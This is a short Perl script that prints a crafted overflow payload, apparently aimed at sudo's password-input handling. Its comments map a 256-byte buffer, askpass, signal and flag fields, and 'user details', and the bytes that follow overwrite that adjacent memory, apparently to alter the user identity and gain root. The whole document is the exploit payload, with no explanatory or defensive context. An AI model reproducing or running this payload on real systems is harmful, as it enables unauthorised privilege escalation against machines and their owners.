$buf_sz = 256;
$askpass_sz = 32;
$signo_sz = 4*65;
$tgetpass_flag = "\x04\x00\x00\x00" . ("\x00"x24);
# 0x555555577b20
# Layout:
# Buffer[256]
# askpass [32]
# Signo [260]
# Flags [28]
# User details
print("\x00\x15"x($buf_sz+$askpass_sz) .
     ("\x00\x15"x$signo_sz) .
     ($tgetpass_flag) . "\x37\x98\x01\x00\x35\x98\x01\x00\x35\x98\x01\x00\xff\xff\xff\xff\x35\x98\x01\x00\x00\x00\x00\x00".
     "\x00\x00\x00\x00\x00\x15"x104 . "\n");
